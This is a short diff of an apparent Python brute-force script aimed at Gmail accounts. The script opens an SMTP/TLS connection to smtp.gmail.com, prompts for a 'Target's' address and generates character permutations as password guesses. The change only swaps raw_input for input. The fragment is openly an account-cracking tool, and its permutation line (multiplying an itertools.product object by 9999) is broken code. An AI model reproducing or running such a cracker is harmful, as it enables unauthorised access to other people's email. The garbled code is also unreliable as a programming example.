@@ -5,7 +5,7 @@ smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
 smtpserver.ehlo()
 smtpserver.starttls()
 
-user = raw_input("Enter Target's Gmail Address: ")
+user = input("Enter Target's Gmail Address: ")
 def print_perms(chars, minlen, maxlen): 
     for n in range(minlen, maxlen+1): 
         for perm in itertools.product(chars, repeat=n) * 9999: 
